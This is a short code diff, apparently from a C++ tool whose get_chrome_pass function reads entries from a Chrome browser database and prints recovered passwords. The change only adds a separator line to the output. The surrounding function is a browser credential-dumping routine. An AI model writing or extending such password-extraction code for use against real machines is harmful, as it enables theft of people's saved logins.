@@ -59,7 +59,7 @@ void get_chrome_pass(sqlite3* db)
 
 		std::string pass = m_pbOutput;
         std::cout<<"password: "<<pass<<std::endl;
-            
+        std::cout<<"*********************************************"<<std::endl;
         rc = sqlite3_step(pStmt);
     }
     rc = sqlite3_finalize(pStmt);
